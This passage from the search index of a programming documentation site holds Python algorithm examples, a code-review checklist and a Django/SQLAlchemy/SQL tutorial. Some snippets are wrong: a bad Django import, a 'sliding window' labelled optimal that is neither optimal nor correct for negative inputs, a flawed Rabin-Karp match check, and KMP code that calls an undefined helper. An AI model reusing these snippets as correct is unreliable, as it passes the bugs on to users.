min-heap and add it to the result\n    # if the top element has a next element add it to the heap\n    prehead = point = ListNode(-1)\n    while min_heap:\n        val, node = heapq.heappop(min_heap)\n        point.next = ListNode(val)\n        point = point.next\n        node = node.next\n        if node is not None:\n            heapq.heappush(min_heap, (node.val, node))\n\n    return prehead.next\n</code></pre> Real world example: K-way merge is used in big data processing for merging large datasets from multiple sources.</p>"},{"location":"programming/algorithms/#8-breadth-first-search-bfs","title":"8. Breadth-First Search (BFS)","text":"<p>BFS is an algorithm for traversing or searching tree or graph data structures. It starts at the tree root and explores all of the neighbor nodes at the present depth prior to moving on to nodes at the next depth level.</p> <p>Python example:</p> <p><pre><code>from collections import deque\n\ndef bfs(graph, root):\n    visited = set()\n    queue = deque([root])\n\n    while queue:\n        vertex = queue.popleft()\n        print(str(vertex) + \" \", end=\"\")\n\n        # add neighbours to the queue\n        for neighbour in graph[vertex]:\n            if neighbour not in visited:\n                visited.add(neighbour)\n                queue.append(neighbour)\n</code></pre> Real world example: BFS is often used in AI for finding the shortest path in a graph (like Google Maps to find shortest route).</p>"},{"location":"programming/algorithms/#9-depth-first-search-dfs","title":"9. Depth-First Search (DFS)","text":"<p>DFS is an algorithm for traversing or searching tree or graph data structures. The algorithm starts at the root node and explores as far as possible along each branch before backtracking.</p> <p>Python example:</p> <p><pre><code>def dfs(graph, start, visited=None):\n    if visited is None:\n        visited = set()\n    visited.add(start)\n\n    print(start, end=' ')\n\n    for next in graph[start] - visited:\n        dfs(graph, next, visited)\n    return visited\n</code></pre> Real world example: DFS can be used to solve puzzles such as mazes.</p>"},{"location":"programming/algorithms/#10-backtracking","title":"10. Backtracking","text":"<p>Backtracking is a strategy for finding all (or some) solutions to computational problems, notably constraint satisfaction problems, by incrementally building candidates to the solutions, and abandoning a candidate as soon as it's determined that it cannot be extended to a valid solution.</p> <p>Python example (Generating all possible permutations of a list):</p> <p><pre><code>def generate_permutations(nums):\n    def backtrack(start):\n        # if we are at the end of the array, we have a complete permutation\n        if start == len(nums):\n            output.append(nums[:])\n            return\n        for i in range(start, len(nums)):\n            # swap the current index with the start\n            nums[start], nums[i] = nums[i], nums[start]\n            # continue building the permutation\n            backtrack(start + 1)\n            # undo the swap\n            nums[start], nums[i] = nums[i], nums[start]\n\n    output = []\n    backtrack(0)\n    return output\n</code></pre> Real world example: Backtracking is used in many algorithms for searching and constraint satisfaction problems, such as Sudoku.</p>"},{"location":"programming/algorithms/#11-dynamic-programming-dp","title":"11. Dynamic Programming (DP)","text":"<p>Dynamic Programming is a method for solving a complex problem by breaking it down into simpler subproblems, solving each of those subproblems just once, and storing their solutions to avoid duplicate work.</p> <p>Python example (Finding the nth Fibonacci number):</p> <p><pre><code>def fibonacci(n):\n    dp = [0, 1] + [0]*(n-1)\n    for i in range(2, n+1):\n        dp[i] = dp[i-1] + dp[i-2]\n    return dp[n]\n</code></pre> Real world example: DP is used in many areas of computer science, such as in optimizing the operation of a network or the performance of a computer program.</p>"},{"location":"programming/algorithms/#12-kadanes-algorithm","title":"12. Kadane's Algorithm","text":"<p>Kadane's algorithm is a Dynamic Programming approach to solve \"the largest contiguous elements in an array\" with runtime of O(n).</p> <p>Python example:</p> <p><pre><code>def max_sub_array(nums):\n    if not nums:\n        return 0\n\n    cur_sum = max_sum = nums[0]\n\n    for num in nums[1:]:\n        cur_sum = max(num, cur_sum + num)\n        max_sum = max(max_sum, cur_sum)\n\n    return max_sum\n</code></pre> Real world example: Kadane's algorithm can be used in computer vision to detect the largest area of a certain color in an image.</p>"},{"location":"programming/algorithms/#13-knapsack-problem","title":"13. Knapsack Problem","text":"<p>The knapsack problem is a problem in combinatorial optimization. Given a set of items, each with a weight and a value, the goal is to determine the number of each item to include in a collection so that the total weight is less than or equal to a given limit and the total value is as large as possible.</p> <p>Python example:</p> <p><pre><code>def knapSack(W, wt, val, n):\n    K = [[0 for w in range(W + 1)]\n            for i in range(n + 1)]\n\n    # Build table K[][] in bottom\n    # up manner\n    for i in range(n + 1):\n        for w in range(W + 1):\n            if i == 0 or w == 0:\n                K[i][w] = 0\n            elif wt[i - 1] &lt;= w:\n                K[i][w] = max(val[i - 1]\n                  + K[i - 1][w - wt[i - 1]],\n                               K[i - 1][w])\n            else:\n                K[i][w] = K[i - 1][w]\n\n    return K[n][W]\n</code></pre> Real world example: The knapsack problem appears in resource allocation in computing. For example, given a set of servers, each with a certain capacity and cost, the goal is to find the least costly way to fulfill a client's resource request.</p>"},{"location":"programming/algorithms/#14-tree-depth-first-search","title":"14. Tree Depth-First Search","text":"<p>This is an algorithm for traversing or searching tree data structures. The algorithm starts at the root and explores as far as possible along each branch before backtracking.</p> <p>Python example:</p> <p><pre><code>class Node:\n    def __init__(self, value, left=None, right=None):\n        self.value = value\n        self.left = left\n        self.right = right\n\ndef dfs(node):\n    if node is None:\n        return\n    print(node.value, end=' ')\n    dfs(node.left)\n    dfs(node.right)\n</code></pre> Real world example: DFS can be used in games like chess where you need to forecast player's moves ahead of time.</p>"},{"location":"programming/algorithms/#15-tree-breadth-first-search","title":"15. Tree Breadth-First Search","text":"<p>This is an algorithm for traversing or searching tree data structures. It starts at the tree root and explores all of the neighbor nodes at the present depth prior to moving on to nodes at the next depth level.</p> <p>Python example:</p> <p><pre><code>from collections import deque\n\nclass Node:\n    def __init__(self, value, left=None, right=None):\n        self.value = value\n        self.left = left\n        self.right = right\n\ndef bfs(root):\n    queue = deque([root])\n    while queue:\n        node = queue.popleft()\n        print(node.value, end=' ')\n        if node.left:\n            queue.append(node.left)\n        if node.right:\n            queue.append(node.right)\n</code></pre> Real world example: BFS can be used in social networking sites when suggesting people you may know, as it looks at closest connections first.</p>"},{"location":"programming/algorithms/#16-topological-sort","title":"16. Topological Sort","text":"<p>Topological sort is used to find a linear ordering of elements that have dependencies on each other. For instance, if task 'a' is dependent on task 'b', in the sorted order, 'b' comes before 'a'.</p> <p>Python example:</p> <p><pre><code>from collections import defaultdict, deque\n\ndef topological_sort(vertices, edges):\n    sorted_order = []\n    if vertices &lt;= 0:\n        return sorted_order\n\n    # a. Initialize the graph\n    in_degree = {i: 0 for i in range(vertices)}  # count of incoming edges\n    graph = defaultdict(list)  # adjacency list graph\n\n    # b. Build the graph\n    for edge in edges:\n        parent, child = edge[0], edge[1]\n        graph[parent].append(child)  # put the child into parent's list\n        in_degree[child] += 1  # increment child's inDegree\n\n    # c. Find all sources i.e., all vertices with 0 in-degrees\n    sources = deque()\n    for key in in_degree:\n        if in_degree[key] == 0:\n            sources.append(key)\n\n    # d. For each source, add it to the sortedOrder and subtract one from all of its children's in-degrees\n    # if a child's in-degree becomes zero, add it to the sources queue\n    while sources:\n        vertex = sources.popleft()\n        sorted_order.append(vertex)\n        for child in graph[vertex]:  # get the node's children to decrement their in-degrees\n            in_degree[child] -= 1\n            if in_degree[child] == 0:\n                sources.append(child)\n\n    # topological sort is not possible as the graph has a cycle\n    if len(sorted_order) != vertices:\n        return []\n\n    return sorted_order\n</code></pre> Real world example: Topological Sort can be used in scheduling tasks, determining the order of courses to take, etc.</p>"},{"location":"programming/algorithms/#17-trie","title":"17. Trie","text":"<p>A Trie, also called digital tree and sometimes radix tree or prefix tree, is a kind of search tree\u2014an ordered tree data structure used to store a dynamic set or associative array where the keys are usually strings.</p> <p>Python example:</p> <p><pre><code>class TrieNode:\n    def __init__(self):\n        self.children = {}\n        self.endOfString = False\n\nclass Trie:\n    def __init__(self):\n        self.root = TrieNode()\n\n    def insert_word(self, word):\n        current = self.root\n        for char in word:\n            node = current.children.get(char)\n            if not node:\n                node = TrieNode()\n                current.children[char] = node\n            current = node\n        current.endOfString = True\n\n    def search_word(self, word):\n        current = self.root\n        for char in word:\n            node = current.children.get(char)\n            if not node:\n                return False\n            current = node\n        return current.endOfString\n</code></pre> Real world example: Tries are used in search engines for text autocompletion.</p>"},{"location":"programming/algorithms/#18-graph-bipartite-check","title":"18. Graph - Bipartite Check","text":"<p>A Bipartite graph is a graph whose vertices can be divided into two independent sets, U and V such that every edge (u, v) either connects a vertex from U to V or a vertex from V to U.</p> <p>Python example:</p> <p><pre><code>def is_bipartite(graph):\n    color = {}\n    for node in range(len(graph)):\n        if node not in color:\n            stack = [node]\n            color[node] = 0\n            while stack:\n                node = stack.pop()\n                for neighbour in graph[node]:\n                    if neighbour not in color:\n                        stack.append(neighbour)\n                        color[neighbour] = color[node] ^ 1\n                    elif color[neighbour] == color[node]:\n                        return False\n    return True\n</code></pre> Real world example: Bipartite graphs are used in matching algorithms, such as in job allocation where jobs can be matched to job-seekers.</p>"},{"location":"programming/algorithms/#19-bitwise-xor","title":"19. Bitwise XOR","text":"<p>XOR is a binary operation that takes two bit patterns of equal length and performs the logical exclusive OR operation on each pair of corresponding bits. The result in each position is 1 if only the first bit is 1 OR only the second bit is 1, but will be 0 if both are 0 or both are 1.</p> <p>Python example:</p> <p><pre><code>def find_single_number(arr):\n    num = 0\n    for i in arr:\n        num ^= i\n    return num\n</code></pre> Real world example: Bitwise XOR can be used in cryptography, error detection and correction algorithms.</p>"},{"location":"programming/algorithms/#20-sliding-window-optimal","title":"20. Sliding Window - Optimal","text":"<p>The sliding window pattern is used to perform a required operation on a specific window size of a given large dataset or array. This window could either be a subarray or a subset of data that you are taking from a defined set of data.</p> <p>Python example (Finding maximum sum of a subarray of size 'k'):</p> <p><pre><code>def max_sub_array_of_size_k(k, arr):\n    max_sum = 0\n    window_sum = 0\n\n    for i in range(len(arr) - k + 1):\n        window_sum = sum(arr[i:i+k])\n        max_sum = max(max_sum, window_sum)\n\n    return max_sum\n</code></pre> Real world example: The sliding window concept is used in TCP data transmission for flow control and congestion control.</p>"},{"location":"programming/algorithms/#21-quick-sort","title":"21. Quick Sort","text":"<p>QuickSort is a Divide and Conquer algorithm, which picks an element as pivot and partitions the given array around the picked pivot.</p> <p>Python example:</p> <pre><code>def quick_sort(arr):\n    if len(arr) &lt;= 1:\n        return arr\n    pivot = arr[len(arr) // 2]\n    left = [x for x in arr if x &lt; pivot]\n    middle = [x for x in arr if x == pivot]\n    right = [x for x in arr if x &gt; pivot]\n    return quick_sort(left) + middle + quick_sort(right)\n</code></pre>"},{"location":"programming/algorithms/#22-merge-sort","title":"22. Merge Sort","text":"<p>Merge Sort is a Divide and Conquer algorithm, which works by dividing the unsorted list into n sublists, each containing one element, and then repeatedly merging sublists to produce new sorted sublists until there is only one sublist remaining.</p> <p>Python example:</p> <pre><code>def merge_sort(arr):\n    if len(arr) &lt;= 1:\n        return arr\n\n    def merge(left, right):\n        if not left:\n            return right\n        if not right:\n            return left\n        if left[0] &lt; right[0]:\n            return [left[0]] + merge(left[1:], right)\n        return [right[0]] + merge(left, right[1:])\n\n    mid = len(arr) // 2\n    return merge(merge_sort(arr[:mid]), merge_sort(arr[mid:]))\n</code></pre>"},{"location":"programming/algorithms/#23-heap-sort","title":"23. Heap Sort","text":"<p>Heap sort is a comparison-based sorting algorithm that uses a binary heap data structure. </p> <p>Python example:</p> <pre><code>import heapq\n\ndef heap_sort(arr):\n    heapq.heapify(arr)\n    return [heapq.heappop(arr) for _ in range(len(arr))]\n</code></pre>"},{"location":"programming/algorithms/#24-insertion-sort","title":"24. Insertion Sort","text":"<p>Insertion sort is a simple sorting algorithm that works similar to the way you sort playing cards in your hands. The array is virtually split into a sorted and an unsorted region.</p> <p>Python example:</p> <pre><code>def insertion_sort(arr):\n    for i in range(1, len(arr)):\n        key = arr[i]\n        j = i - 1\n        while j &gt;= 0 and key &lt; arr[j]:\n            arr[j + 1] = arr[j]\n            j -= 1\n        arr[j + 1] = key\n    return arr\n</code></pre>"},{"location":"programming/algorithms/#25-binary-search","title":"25. Binary Search","text":"<p>Binary search is an efficient algorithm for finding an item from a sorted list of items. It works by repeatedly dividing in half the portion of the list that could contain the item, until you've narrowed down the possible locations to just one.</p> <p>Python example:</p> <pre><code>def binary_search(arr, target):\n    left, right = 0, len(arr) - 1\n    while left &lt;= right:\n        mid = left + (right - left) // 2\n        if arr[mid] == target:\n            return mid\n        elif arr[mid] &lt; target:\n            left = mid + 1\n        else:\n            right = mid - 1\n    return -1\n</code></pre>"},{"location":"programming/algorithms/#26-breadth-first-search-graphs","title":"26. Breadth-First Search (Graphs)","text":"<p>Breadth-first search (BFS) is an algorithm for traversing or searching tree or graph data structures. It starts at the tree root and explores all of the neighbor nodes at the present depth prior to moving on to nodes at the next depth level.</p> <p>Python example (Using adjacency list representation of graph):</p> <pre><code>from collections import deque\n\ndef bfs(graph, root):\n    visited = set()\n    queue = deque([root])\n\n    while queue:\n        vertex = queue.popleft()\n        print(vertex, end=\" \")\n\n        for neighbour in graph[vertex]:\n            if neighbour not in visited:\n                visited.add(neighbour)\n                queue.append(neighbour)\n</code></pre>"},{"location":"programming/algorithms/#27-depth-first-search-graphs","title":"27. Depth-First Search (Graphs)","text":"<p>Depth-first search (DFS) is an algorithm for traversing or searching tree or graph data structures. The algorithm starts at the root node and explores as far as possible along each branch before backtracking.</p> <p>Python example (Using adjacency list representation of graph):</p> <pre><code>def dfs(graph, root, visited=None):\n    if visited is None:\n        visited = set()\n    visited.add(root)\n    print(root, end=\" \")\n\n    for neighbour in graph[root]:\n        if neighbour not in visited:\n            dfs(graph, neighbour, visited)\n    return visited\n</code></pre>"},{"location":"programming/algorithms/#28-dijkstras-algorithm","title":"28. Dijkstra's Algorithm","text":"<p>Dijkstra\u2019s algorithm is a shortest path algorithm that works on a weighted graph. The shortest path in this case is based on the weight of the edges.</p> <p>Python example:</p> <pre><code>import heapq\n\ndef dijkstras(graph, start):\n    distances = {node: float('infinity') for node in graph}\n    distances[start] = 0\n    pq = [(0, start)]\n\n    while pq:\n        current_distance, current_node = heapq.heappop(pq)\n\n        if current_distance &gt; distances[current_node]:\n            continue\n\n        for neighbour, weight in graph[current_node].items():\n            distance = current_distance + weight\n\n            if distance &lt; distances[neighbour]:\n                distances[neighbour] = distance\n                heapq.heappush(pq, (distance, neighbour))\n\n    return distances\n</code></pre>"},{"location":"programming/algorithms/#29-a-search-algorithm","title":"29. A* Search Algorithm","text":"<p>A* is a graph traversal and path search algorithm, which is often used in many fields of computer science due to its completeness, optimality, and optimal efficiency.</p> <p>Python example (Implementing A* to solve a 2D grid-based pathfinding problem would be too large to fit here due to the need for a suitable heuristic function and priority queue data structure.)</p>"},{"location":"programming/algorithms/#30-floyd-warshall-algorithm","title":"30. Floyd-Warshall Algorithm","text":"<p>The Floyd-Warshall algorithm is a shortest path algorithm for graphs. It's used to find the shortest paths between all pairs of vertices in a graph, which may represent, for example, road networks.</p> <p>Python example:</p> <pre><code>def floyd_warshall(graph):\n    distance = dict()\n\n    for vertex in graph:\n        distance[vertex] = dict()\n        for neighbour in graph:\n            distance[vertex][neighbour] = graph[vertex][neighbour]\n\n    for intermediate_vertex in graph:\n        for vertex in graph:\n            for neighbour in graph:\n                if distance[vertex][intermediate_vertex] + distance[intermediate_vertex][neighbour] &lt; distance[vertex][neighbour]:\n                    distance[vertex][neighbour] = distance[vertex][intermediate_vertex] + distance[intermediate_vertex][neighbour]\n\n    return distance\n</code></pre>"},{"location":"programming/algorithms/#31-knapsack-problem","title":"31. Knapsack Problem","text":"<p>The knapsack problem is a problem in combinatorial optimization: Given a set of items, each with a weight and a value, determine the number of each item to include in a collection so that the total weight is less than or equal to a given limit and the total value is as large as possible.</p> <p>Python example (0/1 Knapsack Problem):</p> <pre><code>def knapSack(W, wt, val, n):\n    K = [[0 for w in range(W+1)] for i in range(n+1)]\n\n    for i in range(n+1):\n        for w in range(W+1):\n            if i == 0 or w == 0:\n                K[i][w] = 0\n            elif wt[i-1] &lt;= w:\n                K[i][w] = max(val[i-1] + K[i-1][w-wt[i-1]], K[i-1][w])\n            else:\n                K[i][w] = K[i-1][w]\n\n    return K[n][W]\n</code></pre>"},{"location":"programming/algorithms/#32-travelling-salesman-problem","title":"32. Travelling Salesman Problem","text":"<p>The travelling salesman problem (TSP) asks the following question: \"Given a list of cities and the distances between each pair of cities, what is the shortest possible route that visits each city exactly once and returns to the origin city?\"</p> <p>Python example (Simple approach for TSP):</p> <pre><code>from itertools import permutations\n\ndef travellingSalesmanProblem(graph, s):\n    vertex = []\n    for i in range(len(graph)):\n        if i != s:\n            vertex.append(i)\n\n    min_path = float('inf')\n    next_permutation=permutations(vertex)\n    for i in next_permutation:\n        current_pathweight = 0\n\n        k = s\n        for j in i:\n            current_pathweight += graph[k][j]\n            k = j\n        current_pathweight += graph[k][s]\n\n        min_path = min(min_path, current_pathweight)\n\n    return min_path\n</code></pre>"},{"location":"programming/algorithms/#33-kruskals-algorithm","title":"33. Kruskal\u2019s Algorithm","text":"<p>Kruskal's algorithm finds a minimum spanning forest of an undirected edge-weighted graph. If the graph is connected, it finds a minimum spanning tree.</p> <p>Python example (too long to fit due to the need for a disjoint set data structure)</p>"},{"location":"programming/algorithms/#34-prims-algorithm","title":"34. Prim's Algorithm","text":"<p>Prim's algorithm is a greedy algorithm that finds a minimum spanning tree for a weighted undirected graph.</p> <p>Python example (too long to fit due to the need for a priority queue data structure)</p>"},{"location":"programming/algorithms/#35-bellman-ford-algorithm","title":"35. Bellman-Ford Algorithm","text":"<p>The Bellman\u2013Ford algorithm is an algorithm that computes shortest paths from a single source vertex to all of the other vertices in a weighted digraph.</p> <p>Python example:</p> <pre><code>def bellman_ford(graph, source_vertex):\n    distance, predecessor = dict(), dict()\n\n    for node in graph:\n        distance[node], predecessor[node] = float('inf'), None\n    distance[source_vertex] = 0\n\n    for _ in range(len(graph) - 1):\n        for node in graph:\n            for neighbour in graph[node]:\n                if distance[neighbour] &gt; distance[node] + graph[node][neighbour]:\n                    distance[neighbour], predecessor[neighbour] = distance[node] + graph[node][neighbour], node\n\n    for node in graph:\n        for neighbour in graph[node]:\n            assert distance[neighbour] &lt;= distance[node] + graph[node][neighbour], \"Negative Cycle\"\n\n    return distance, predecessor\n</code></pre>"},{"location":"programming/algorithms/#36-z-algorithm-pattern-searching","title":"36. Z-algorithm (Pattern Searching)","text":"<p>Z algorithm is a linear time string matching algorithm which runs in O(n) complexity. It is used to find all occurrences of a pattern in a string, which is common string searching problem.</p> <p>Python example:</p> <pre><code>def getZarr(string, z):\n    n = len(string)\n    l, r, k = 0, 0, 0\n\n    for i in range(1, n):\n        if i &gt; r:\n            l, r = i, i\n            while r &lt; n and string[r - l] == string[r]:\n                r += 1\n            z[i] = r - l\n            r -= 1\n        else:\n            k = i - l\n            if z[k] &lt; r - i + 1:\n                z[i] = z[k]\n            else:\n                l = i\n                while r &lt; n and string[r - l] == string[r]:\n                    r += 1\n                z[i] = r - l\n                r -= 1\n</code></pre>"},{"location":"programming/algorithms/#37-kmp-knuth-morris-pratt-pattern-searching","title":"37. KMP (Knuth Morris Pratt) Pattern Searching","text":"<p>The KMP matching algorithm uses degenerating property (pattern having same sub-patterns appearing more than once in the pattern) of the pattern and improves the worst-case complexity to O(n).</p> <p>Python example:</p> <pre><code>def KMPSearch(pat, txt):\n    M = len(pat)\n    N = len(txt)\n    lps = [0]*M\n    j = 0\n    computeLPSArray(pat, M, lps)\n    i = 0\n    while i &lt; N:\n        if pat[j] == txt[i]:\n            i += 1\n            j += 1\n        if j == M:\n            print(\"Found pattern at index \" + str(i-j))\n            j = lps[j-1]\n        elif i &lt; N and pat[j] != txt[i]:\n            if j != 0:\n                j = lps[j-1]\n            else:\n                i += 1\n</code></pre>"},{"location":"programming/algorithms/#38-rabin-karp-algorithm-for-pattern-searching","title":"38. Rabin-Karp Algorithm for Pattern Searching","text":"<p>Rabin-Karp is a pattern searching algorithm to find the pattern in a more efficient way. It checks the pattern by moving window one by one, but without checking all characters for all cases, it finds the hash value. When the hash value is matched, then only it tries to check each character.</p> <p>Python example:</p> <pre><code>def search(pattern, txt, q):\n    M = len(pattern)\n    N = len(txt)\n    i = 0\n    j = 0\n    p = 0\n    t = 0\n    h = 1\n    d = 256\n    for i in range(M-1):\n        h = (h*d)%q\n    for i in range(M):\n        p = (d*p + ord(pattern[i]))%q\n        t = (d*t + ord(txt[i]))%q\n    for i in range(N-M+1):\n        if p==t:\n            for j in range(M):\n                if txt[i+j] != pattern[j]:\n                    break\n            j+=1\n            if j==M:\n                print(\"Pattern found at index \" + str(i))\n        if i &lt; N-M:\n            t = (d*(t-ord(txt[i])*h) + ord(txt[i+M]))%q\n            if t &lt; 0:\n                t = t+q\n</code></pre>"},{"location":"programming/algorithms/#39-kosarajus-algorithm-to-find-strongly-connected-components-in-a-graph","title":"39. Kosaraju's algorithm to find strongly connected components in a graph","text":"<p>Kosaraju's algorithm performs two passes over a graph to identify its strongly connected components. It's used in graph theory to identify clusters or related groups within the graph.</p> <p>Python example (due to its complexity, the full implementation is not provided here).</p>"},{"location":"programming/algorithms/#40-boyer-moore-algorithm-for-pattern-searching","title":"40. Boyer Moore Algorithm for Pattern Searching","text":"<p>Boyer Moore is a combination of following two approaches. 1) Bad Character Heuristic 2) Good Suffix Heuristic</p> <p>Python example:</p> <pre><code>NO_OF_CHARS = 256\ndef badCharHeuristic(string, size):\n    badChar = [-1]*NO_OF_CHARS\n    for i in range(size):\n        badChar[ord(string[i])] = i;\n    return badChar\n\ndef search(txt, pat):\n    m = len(pat)\n    n = len(txt)\n    badChar = badCharHeuristic(pat, m)\n    s = 0\n    while(s &lt;= n-m):\n        j = m-1\n        while j&gt;=0 and pat[j] == txt[s+j]:\n            j -= 1\n        if j&lt;0:\n            print(\"Pattern occur at shift = {}\".format(s))\n            s += (m-badChar[ord(txt[s+m])] if s+m&lt;n else 1)\n        else:\n            s += max(1, j-badChar[ord(txt[s+j])])\n</code></pre>"},{"location":"programming/code_review/","title":"Code Review","text":"<pre><code> Are CI builds passing? If no, why?\n\n\nIs the code easily understood?\nDoes the code work? Does it perform its intended function, the logic is correct, etc?\nDoes the error handling work?\nIs memory usage acceptable, even with large inputs?\n\n\nIs code covered by functional or unit tests?\nAre error paths covered by functional or unit tests? All errors which are relatively easy to check must be checked: error conditions like \u201copen() failed after stat() was successfull\u201d or \u201carray size greater then INT_MAX\u201d may be ignored for being just as unlikely as uneasy to test, but otherwise having bugs in code which does error handling is way too common to be ignored.\nFor new code, are unit tests written where needed?\n\n\nAre invalid parameter values handled where needed?\nCan any global/static variables be replaced?\nAre variables/functions named intuitively?\nCan any function attributes be used?\n\n\nIs there any redundant or duplicate code?\nIs the code modular enough?\nCan any of the code be replaced with library functions?\nDo loops have a set length and correct termination conditions?\nCan any logging or debugging code be removed?\nAre there any unneeded assert statements?\n\n\nDoes the code conform to the style guide?\nOptimization that makes code harder to read should only be implemented if a profiler or other tool has indicated that the routine stands to gain from optimization. These kinds of optimizations should be well-documented and code that performs the same task simply should be preserved somewhere.\n\n\nAre return values being checked?\nAre there any use after frees?\nAre there any resource leaks? Memory leaks, unclosed sockets, etc.\nAre there any null pointer dereferences?\nAre any uninitialized variables used?\nAre there any cases of possible arithmetic overflow?\n</code></pre> <p>Documentation</p> <pre><code>Are there any superfluous comments?\nWhere needed, do comments exist and describe the intent of the code?\nAre any comments made outdated by the new code?\nIs any unusual behavior or edge-case handling described?\nAre complex algorithms explained and justified?\nIs code that depends on non-obvious behavior in external libraries documented with reference to external documentation?\nIs the use and function of API functions documented?\nAre data structures/typedefs explained?\nIs there any incomplete code, e.g., code marked TODO, FIXME, or XXX?\n</code></pre>"},{"location":"programming/orm_sql/","title":"Advanced ORM Tutorial: Django, SQLAlchemy &amp; Raw SQL","text":""},{"location":"programming/orm_sql/#1-filtering-records-with-conditional-logic","title":"1. Filtering Records with Conditional Logic","text":""},{"location":"programming/orm_sql/#django-orm","title":"Django ORM:","text":"<pre><code>from django.models import Q\nYourModel.objects.filter(Q(field1=\"value1\") | Q(field2=\"value2\"))\n</code></pre>"},{"location":"programming/orm_sql/#sqlalchemy","title":"SQLAlchemy:","text":"<pre><code>from sqlalchemy import or_\nsession.query(YourModel).filter(or_(YourModel.field1 == 'value1', YourModel.field2 == 'value2'))\n</code></pre>"},{"location":"programming/orm_sql/#raw-sql","title":"Raw SQL:","text":"<pre><code>SELECT * FROM your_model WHERE field1 = 'value1' OR field2 = 'value2';\n</code></pre>"},{"location":"programming/orm_sql/#2-aggregating-data","title":"2. Aggregating Data","text":""},{"location":"programming/orm_sql/#django-orm_1","title":"Django ORM:","text":"<pre><code>from django.db.models import Sum\nYourModel.objects.aggregate(Sum('field1'))\n</code></pre>"},{"location":"programming/orm_sql/#sqlalchemy_1","title":"SQLAlchemy:","text":"<pre><code>from sqlalchemy import func\nsession.query(func.sum(YourModel.field1)).scalar()\n</code></pre>"},{"location":"programming/orm_sql/#raw-sql_1","title":"Raw SQL:","text":"<pre><code>SELECT SUM(field1) FROM your_model;\n</code></pre>"},{"location":"programming/orm_sql/#3-joining-tables","title":"3. Joining Tables","text":""},{"location":"programming/orm_sql/#django-orm_2","title":"Django ORM:","text":"<pre><code>YourModel.objects.select_related('related_model')\n</code></pre>"},{"location":"programming/orm_sql/#sqlalchemy_2","title":"SQLAlchemy:","text":"<pre><code>session.query(YourModel, RelatedModel).join(RelatedModel)\n</code></pre>"},{"location":"programming/orm_sql/#raw-sql_2","title":"Raw SQL:","text":"<pre><code>SELECT * FROM your_model JOIN related_model ON your_model.related_id = related_model.id;\n</code></pre>"},{"location":"programming/orm_sql/#4-grouping-records","title":"4. Grouping Records","text":""},{"location":"programming/orm_sql/#django-orm_3","title":"Django ORM:","text":"<pre><code>from django.db.models import Count\nYourModel.objects.values('field1').annotate(Count('field2'))\n</code></pre>"},{"location":"programming/orm_sql/#sqlalchemy_3","title":"SQLAlchemy:","text":"<pre><code>from sqlalchemy import func\nsession.query(YourModel.field1, func.count(YourModel.field2)).group_by(YourModel.field1)\n</code></pre>"},{"location":"programming/orm_sql/#raw-sql_3","title":"Raw SQL:","text":"<pre><code>SELECT field1, COUNT(field2) FROM your_model GROUP BY field1;\n</code></pre>"},{"location":"programming/orm_sql/#5-complex-subqueries","title":"5. Complex Subqueries","text":""},{"location":"programming/orm_sql/#django-orm_4","title":"Django ORM:","text":"<pre><code>subquery = YourModel.objects.filter(field1=\"value1\").values('field2')\nresult = OtherModel.objects.filter(field3__in=subquery)\n</code></pre>"},{"location":"programming/orm_sql/#sqlalchemy_4","title":"SQLAlchemy:","text":"<pre><code>subquery = session.query(YourModel.field2).filter(YourModel.field1 == 'value1').subquery()\nresult = session.query(OtherModel).filter(OtherModel.field3.in_(subquery))\n</code></pre>"},{"location":"programming/orm_sql/#raw-sql_4","title":"Raw SQL:","text":"<pre><code>SELECT * FROM other_model WHERE field3 IN (SELECT field2 FROM your_model WHERE field1 = 'value1');\n</code></pre>"},{"location":"programming/orm_sql/#6-limiting-and-offsetting-results","title":"6. Limiting and Offsetting Results","text":""},{"location":"programming/orm_sql/#django-orm_5","title":"Django ORM:","text":"<pre><code>YourModel.objects.all()[5:10]\n</code></pre>"},{"location":"programming/orm_sql/#sqlalchemy_5","title":"SQLAlchemy:","text":"<pre><code>session.query(YourModel).limit(5).offset(5)\n</code></pre>"},{"location":"programming/orm_sql/#raw-sql_5","title":"Raw SQL:","text":"<pre><code>SELECT * FROM your_model LIMIT 5 OFFSET 5;\n</code></pre>"},{"location":"programming/orm_sql/#7-transactions","title":"7. Transactions","text":""},{"location":"programming/orm_sql/#django-orm_6","title":"Django ORM:","text":"<pre><code>from django.db import transaction\n\nwith transaction.atomic():\n    YourModel.objects.create(field1=\"value1\")\n    YourModel.objects.create(field1=\"value2\")\n</code></pre>"},{"location":"programming/orm_sql/#sqlalchemy_6","title":"SQLAlchemy:","text":"<pre><code>with session.begin():\n    new_record1 = YourModel(field1=\"value1\")\n    new_record2 = YourModel(field1=\"value2\")\n    session.add(new_record1)\n    session.add(new_record2)\n</code></pre>"},{"location":"programming/orm_sql/#raw-sql_6","title":"Raw SQL:","text":"<pre><code>BEGIN;\nINSERT INTO your_model (field1) VALUES ('value1');\nINSERT INTO your_model (field1) VALUES ('value2');\nCOMMIT;\n</code></pre>"},{"location":"programming/orm_sql/#8-custom-fields-expressions","title":"8. Custom Fields &amp; Expressions","text":""},{"location":"programming/orm_sql/#django-orm_7","title":"Django ORM:","text":"<pre><code>from django.db.models import F, ExpressionWrapper, IntegerField\nYourModel.objects.annotate(new_field=ExpressionWrapper(F('field1') + F('field2'), output_field=IntegerField()))\n</code></pre>"},{"location":"programming/orm_sql/#sqlalchemy_7","title":"SQLAlchemy:","text":"<pre><code>from sqlalchemy import func\nsession.query(YourModel, (YourModel.field1 + YourModel.field2).label('new_field'))\n</code></pre>"},{"location":"programming/orm_sql/#raw-sql_7","title":"Raw SQL:","text":"<pre><code>SELECT *, (field1 + field2) AS new_field FROM your_model;\n</code></pre>"},{"location":"programming/orm_sql/#9-case-and-conditional-expressions","title":"9. Case and Conditional Expressions","text":""},{"location":"programming/orm_sql/#django-orm_8","title":"Django ORM:","text":"<pre><code>from django.db.models import Case, When, Value, CharField\nYourModel.objects.annotate(\n    field_status=Case(\n        When(field1=\"value1\", then=Value('status1')),\n        When(field1=\"value2\", then=Value('status2')),\n        default=Value('unknown'),\n        output_field=CharField()\n    )\n)\n</code></pre>"},{"location":"programming/orm_sql/#sqlalchemy_8","title":"SQLAlchemy:","text":"<pre><code>from sqlalchemy.sql.expression import case\nsession.query(YourModel,\n    case([\n        (YourModel.field1 == \"value1\", \"status1\"),\n        (YourModel.field1 == \"value2\", \"status2\"),\n    ], else_=\"unknown\").label('field_status')\n)\n</code></pre>"},{"location":"programming/orm_sql/#raw-sql_8","title":"Raw SQL:","text":"<pre><code>SELECT *,\n    CASE\n        WHEN field1 = 'value1' THEN 'status1'\n        WHEN field1 = 'value2' THEN 'status2'\n        ELSE 'unknown'\n    END AS field_status\nFROM 